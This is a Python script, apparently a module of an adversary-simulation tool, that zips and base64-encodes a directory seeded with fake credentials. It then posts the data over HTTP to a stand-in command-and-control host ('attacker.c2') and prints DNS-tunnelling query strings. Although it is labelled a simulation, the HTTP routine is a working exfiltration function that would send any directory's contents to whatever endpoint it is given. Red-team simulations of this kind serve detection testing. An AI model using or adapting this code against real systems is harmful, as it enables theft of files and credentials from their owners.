import os
import base64
import zipfile
import requests
import time

def zip_directory(source_dir, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, _, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Zipped directory: {output_zip}")
    return output_zip

def base64_encode_file(input_path, output_path):
    with open(input_path, "rb") as f:
        encoded = base64.b64encode(f.read())
    with open(output_path, "wb") as f:
        f.write(encoded)
    print(f"[+] Base64-encoded file saved: {output_path}")
    return output_path

def exfil_via_http(encoded_file_path, endpoint="http://attacker.c2/upload"):
    try:
        with open(encoded_file_path, "rb") as f:
            data = f.read()
        r = requests.post(endpoint, data={"data": data})
        if r.status_code == 200:
            print("[✔] HTTP exfiltration simulated successfully.")
        else:
            print(f"[!] Server responded with: {r.status_code}")
    except Exception as e:
        print(f"[-] HTTP exfil error: {e}")

def simulate_dns_exfil(encoded_file_path, domain="exfil.attacker.c2"):
    print("[+] Simulating DNS exfiltration (prints fake DNS queries)...")
    try:
        with open(encoded_file_path, "rb") as f:
            b64_data = f.read().decode()
            chunks = [b64_data[i:i+30] for i in range(0, len(b64_data), 30)]
            for chunk in chunks[:10]:  # limit to 10 queries for demo
                print(f"{chunk}.{domain}")
    except Exception as e:
        print(f"[-] DNS exfil simulation failed: {e}")

def simulate_exfil(domain):
    print(f"\n=== Exfiltration Simulation on {domain} ===")

    source_dir = f"output/{domain}_files"
    os.makedirs(source_dir, exist_ok=True)

    # Example fake data
    with open(os.path.join(source_dir, "credentials.txt"), "w") as f:
        f.write("username: admin\npassword: letmein123\n")

    zip_path = f"output/{domain}_exfil.zip"
    b64_path = f"output/{domain}_exfil.b64"

    zip_directory(source_dir, zip_path)
    base64_encode_file(zip_path, b64_path)
    exfil_via_http(b64_path)
    simulate_dns_exfil(b64_path)

    print("[+] Exfiltration module complete.")

# Standalone
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", help="Target domain or host for simulation")
    args = parser.parse_args()
    simulate_exfil(args.domain)
